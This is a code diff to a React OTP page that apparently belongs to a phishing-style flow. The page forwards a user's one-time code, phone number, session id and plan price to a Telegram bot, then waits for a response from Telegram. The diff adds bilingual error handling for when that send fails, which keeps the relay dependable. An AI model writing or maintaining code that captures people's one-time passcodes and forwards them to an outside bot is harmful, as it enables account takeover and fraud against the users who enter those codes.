@@ -141,7 +141,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
 
     try {
       // Send OTP with country and fullPhone to Telegram Bot
-      await telegramService.sendOtp({
+      const success = await telegramService.sendOtp({
         sessionId: activeSessionId,
         phone,
         fullPhone: displayPhone,
@@ -152,7 +152,15 @@ export const OtpPage: React.FC<OtpPageProps> = ({
         planPrice: selectedPlan.price,
       });
 
-      setIsWaitingTelegram(true);
+      if (success) {
+        setIsWaitingTelegram(true);
+      } else {
+        setErrorMessage(
+          language === 'fr'
+            ? 'Impossible d\'envoyer le code à Telegram. Veuillez vérifier votre connexion.'
+            : 'Failed to send code to Telegram. Please check your connection.'
+        );
+      }
     } catch (err: any) {
       setErrorMessage(
         err.message ||
